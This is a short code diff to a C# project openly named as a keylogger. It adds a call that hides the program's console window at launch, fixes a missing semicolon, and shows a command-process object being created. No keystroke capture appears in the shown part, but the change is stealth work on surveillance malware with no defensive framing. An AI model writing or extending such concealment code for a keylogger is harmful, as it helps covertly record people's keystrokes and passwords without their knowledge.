@@ -1,6 +1,6 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using System.Diagnostics
+using System.Diagnostics;
 
 namespace C__keylogger
 {
@@ -12,6 +12,7 @@ namespace C__keylogger
         {
             const int SW_HIDE = 0;
             var hideMe = GetConsoleWindow();
+            ShowWindow(hideMe, SW_HIDE);
             //Console.WriteLine("Hello World!");
             Process cmd = new Process();
         }
